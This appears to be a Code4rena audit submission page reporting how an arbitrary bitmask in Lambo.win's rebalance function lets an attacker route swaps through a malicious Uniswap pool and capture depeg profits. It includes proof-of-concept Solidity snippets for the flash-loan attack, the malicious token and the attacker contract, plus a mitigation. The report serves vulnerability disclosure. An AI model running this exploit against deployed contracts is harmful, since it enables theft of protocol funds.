@@ -1,0 +1,299 @@
+News
+
+Leaderboard
+
+Submissions
+
+Explore C4
+
+Audits
+
+Bounties
+
+Reports
+
+Support
+
+Resources
+
+Docs
+
+Terms
+
+Privacy
+
+saraswati
+Submissions
+Lambo.win
+/
+F-150
+Medium
+Primary
+S-621
+Attacker can captures `VETH-WETH` depeg profits through a malicious pool, rendering rebalancer useless if VETH Price > WETH Price
+rouhsamad
+64
+Sufficient
+383d ago
+Finding description and impact
+
+LamboRebalanceOnUniwap::rebalance accepts a directionMask argument, an arbitrary uint256 mask. It "OR"s this mask with uniswapPool and passes it to the OKX Router to perform zeroForOne or oneForZero swaps (using the MSB).
+
+    function rebalance(uint256 directionMask, uint256 amountIn, uint256 amountOut) external nonReentrant {
+        uint256 balanceBefore = IERC20(weth).balanceOf(address(this));
+        bytes memory data = abi.encode(directionMask, amountIn, amountOut);
+        IMorpho(morphoVault).flashLoan(weth, amountIn, data);
+        uint256 balanceAfter = IERC20(weth).balanceOf(address(this));
+        uint256 profit = balanceAfter - balanceBefore;
+        require(profit > 0, "No profit made");
+    }
+
+However, This lets an attacker find a pool address with a malicious token. attacker needs to find a pool with a malicious coin (discussed in PoC) so that Given:
+
+malicious_mask = malicious_pool_address & (~uniswapPool)
+
+we will have:
+
+malicious_mask | uniswapPool = maliciousPool
+
+Which allows attacker to insert the malicious pool here by passing malicious_mask to rebalance function:
+
+// given our malicious mask, _v3Pool is the desired pool
+uint256 _v3pool = uint256(uint160(uniswapPool)) | (directionMask);
+uint256[] memory pools = new uint256[](1); pools[0] = _v3pool;
+
+Later, the first condition is not met since the directionMask is not equal to (1 << 255). The code goes to the second condition:
+
+        if (directionMask == _BUY_MASK) {
+            _executeBuy(amountIn, pools);
+
+Second condition:
+
+    	else {
+        	_executeSell(amountIn, pools);
+    	}
+
+_executeSell calls OKXRouter with newly minted VETH (which we received at a discount, if VETH is priced higher than WETH). It then sends VETH to the malicious pool and receives malicious tokens + flash-loaned amount + 1 wei as the profit. the fact that its possible to replace the uniswapPool with our desired malicious pool opens up an attack path which if carefully executed, gives attacker the opportunity to profit from WETH-VETH depeg, leaving Lambo.win no profits at all.
+The only difficult part of this attack is that attacker needs to deploy the malicious coin (which is paired with VETH) at a specifiec address so that their v3 pair address satisfies this condition:
+
+malicious_mask = malicious_pool_address & (~uniswapPool)
+malicious_mask | uniswapPool = maliciousPool
+
+basically the malicious_pool_address must have at least same bits as the uniswapPool so that we can use a malicious mask on it.
+finding an address to satisfy this is hard (but not impossible, given current hardware advancments), for sake of this PoC to be runnable, i have assumed that address of uniswapPool is 0x0000000000000000000000000000000000000093, so that we can find a malicious pool address and token easily, the actuall difficulty of this attack depends on actuall address of WETH-VETH pool, however, i have used a simpler address, just to show that the attack is possible, given enough time.
+After attacker deployed the right contracts, he can use them to profit from WETH-VETH depeges forever (unless new rebalancer is created)
+
+Proof of Concept
+
+If price(VETH) / price(WETH) > 1, this attack is profitable. It costs only transaction gas and leaves nothing for the lambo.win team.
+To execute the PoC, first create the necessary files:
+https://gist.github.com/CDDose/cf9d31046af661d077c442e437b9a06b
+Some interfaces are changed (added new functions) like INonfungiblePositionManager, you can fix errors after creating the files.
+Also most importantly make sure to change LamboRebalanceOnUniwap::uniswapPool to 0x0000000000000000000000000000000000000093 for sake of testing:
+
+    function initialize(
+        address _multiSign,
+        address _vETH,
+        address _uniswap,
+        uint24 _fee
+    ) public initializer {
+        require(_multiSign != address(0), "Invalid _multiSign address");
+        require(_vETH != address(0), "Invalid _vETH address");
+        require(_uniswap != address(0), "Invalid _uniswap address");
+
+        __Ownable_init(_multiSign);
+        __ReentrancyGuard_init();
+
+        fee = _fee;
+        veth = _vETH;
+        uniswapPool = 0x0000000000000000000000000000000000000093;
+    }
+
+PoC scenario:
+1- Price of WETH-VETH depegs, so price(VETH) / price(WETH) > 1
+2- Attacker creates a malicious Token (Token.sol) and a deployer (Deployer.sol) which deploys the malicious token using a salt.
+3- The attacker finds a token address so that if a VETH-TOKEN Uniswap v3 pool is created at a specific fee, the resulting pool address satisfies: ATTACKER_POOL & (~MAIN_POOL) == MASK and MASK | MAIN_POOL == ATTACKER_POOL, attacker uses findSalt.js to find the correct salt, given correct parameters.
+4- After finding the right salt, the attacker deploys the malicious token and creates a VETH-TOKEN Uniswap v3 pair.
+5- Now its possible to call LamboRebalanceOnUniwap::rebalance with MASK so _v3Pool points to the attacker's pool:
+
+        uint256 _v3pool = uint256(uint160(uniswapPool)) | (directionMask);
+        uint256[] memory pools = new uint256[](1);
+        pools[0] = _v3pool;
+
+6- The attacker deploys Attacker.sol. Its takeProfit function takes a Morpho flashloan, then calls LamboRebalanceOnUniwap::rebalance with the flashloaned amount.
+
+    function takeProfit(uint256 loanAmount) public onlyOwner {
+        //1 wei for profit of rebalancer
+        IMorpho(morphoVault).flashLoan(WETH, loanAmount + 1, new bytes(0));
+    }
+
+7- the Attacker.sol::onMorphoFlashLoan configures and supplies (with taken flash-loan) the malicious token so that it will send the given WETH to rebalancer when its "transfer" function is called upon VETH=>MALICIOUS_COIN swap:
+Configure and supply token:
+
+        //Tell token how much WETH to give back to balancer
+        token.setWETHAmount(assets);
+
+        //Then transfer required amount
+        Token(WETH).transfer(address(token), assets);
+
+Malicious Token::transfer:
+
+    function transfer(address to, uint amount) public override returns (bool) {
+        ERC20(WETH).transfer(rebalancer, wethAmount);
+        return super.transfer(to, amount);
+    }
+
+Malicious Token::setWETHAmount:
+
+    function setWETHAmount(uint amount) public {
+        wethAmount = amount;
+    }
+
+this mechanism allows us to pay the profit + flash-loaned amount of rebalancer.
+8- Attacker.sol::onMorphoFlashLoan adds liquidity into the malicious pool before calling LamboRebalanceOnUniwap::rebalance (we need to provide liquidity only for one direction, VETH to our malicious coin, so that means we dont need to provdie extra VETH):
+
+        INonfungiblePositionManager.MintParams memory params = INonfungiblePositionManager
+            .MintParams({
+                token0: address(token) < vETH ? address(token) : vETH,
+                token1: address(token) < vETH ? vETH : address(token),
+                fee: 3000, // 0.3% pool, for example
+                tickLower: 60, //do not care
+                tickUpper: 6000, //do not care
+                amount0Desired: address(token) < vETH ? 1e24 : 0,
+                amount1Desired: address(token) > vETH ? 1e24 : 0, // If you want to start one-sided with Token
+                amount0Min: 0,
+                amount1Min: 0,
+                recipient: address(this),
+                deadline: block.timestamp
+            });
+        (uint256 tokenId, uint128 liquidity, , ) = positionManager.mint(params);
+
+9- LamboRebalanceOnUniwap::rebalance is called with the attacker's irectionMask that results in the malicious pool:
+
+        //Then perform the rebalancing, using our mask and assets - 1 wei
+        rebalancer.rebalance(mask, assets - 1, 0);
+
+then _executeSell is executed, and VETH is minted at a discount (because ETH price is higher than VETH, and we are minting it at a discount):
+
+1        IWETH(weth).withdraw(amountIn);
+2        //@audit receive VETH at discount
+3        VirtualToken(veth).cashIn{value: amountIn}(amountIn);
+4        require(IERC20(veth).approve(address(OKXTokenApprove), amountIn), "Approve failed");
+5        //@audit Swap VETH to malicious coins
+6        IDexRouter(OKXRouter).uniswapV3SwapTo(uint256(uint160(address(this))), amountIn, 0, pools);
+
+NOTE: its on line #6 that balancer receives flash-loaned tokens + 1 wei from maliciousToken::transfer function
+10- malicious pool now received VETH at a discount price.
+11- attacker now withdraws liquidity, receiving VETH and the malicious coins:
+
+
+        //The attack is performed, remove liquidity from our pool
+        //now our pool contains 1 VETH which we got with a discount
+        INonfungiblePositionManager.DecreaseLiquidityParams
+            memory decreaseParams = INonfungiblePositionManager
+                .DecreaseLiquidityParams({
+                    tokenId: tokenId,
+                    liquidity: liquidity,
+                    amount0Min: 0,
+                    amount1Min: 0,
+                    deadline: block.timestamp
+                });
+
+        (uint256 amount0Removed, uint256 amount1Removed) = positionManager
+            .decreaseLiquidity(decreaseParams);
+
+        INonfungiblePositionManager.CollectParams
+            memory collectParams = INonfungiblePositionManager.CollectParams({
+                tokenId: tokenId,
+                recipient: address(this),
+                amount0Max: ~uint128(0),
+                amount1Max: ~uint128(0)
+            });
+
+        //Tell token no need to send anymore WETH To rebalancer
+        token.setWETHAmount(0);
+
+        //Collect tokens from the pool
+        (uint256 amount0Collected, uint256 amount1Collected) = positionManager
+            .collect(collectParams);
+
+12- attacker sells VETH on market and receives more WETH than what it flash-loaned
+
+        require(
+            Token(vETH).approve(address(OKXTokenApprove), 99999999999999999998),
+            "Approve failed"
+        );
+
+        uint256 _v3pool = uint256(uint160(pool));
+        uint256[] memory pools = new uint256[](1);
+        pools[0] = _v3pool;
+
+        IDexRouter(OKXRouter).uniswapV3SwapTo(
+            uint256(uint160(address(this))),
+            99999999999999999998,
+            0,
+            pools
+        );
+
+13- attacker pays the flash-loan and takes rest as profit
+
+        //give back loan
+        Token(WETH).approve(address(morphoVault), assets);
+
+        //we are left with more
+        assert(Token(WETH).balanceOf(address(this)) > 0);
+        console.log(Token(WETH).balanceOf(address(this)));
+
+in the given PoC at gist, attacker makes 100 extra VETH.
+
+Recommended mitigation steps
+
+make sure that directionMask is either (1 << 255) or 0
+
+Links to affected code
+LamboRebalanceOnUniwap.sol#L76
+Opens in a new window
+LamboRebalanceOnUniwap.sol#L109-L114
+Opens in a new window
+Submissions touching same files
+LamboRebalanceOnUniwap.sol
+View full submission
+Comments for the judge
+1
+You are viewing comments for the primary submission, S-621.
+Valid
+Edited: Feb 22
+Shaneson
+
+Very Good founding. Thanks talent auditors
+
+Duplicates
+2
+S-688
+Arbitrary mask parameter in rebalance function allows stealing profit funds
+m4k2
+33
+S-138
+A Uniswap V3 pool (Weth / vEth) can be unbalanced by a malicious user
+zaevlad
+31
+Timeline
+Submitted
+Created: 532d ago
+High
+Triage
+High
+Valid
+Primary
+Sufficient
+Review
+Accepted
+Judging
+Medium
+Valid
+Primary
+Sufficient
+Post-judging QA
+Complete
+Reporting
+Complete
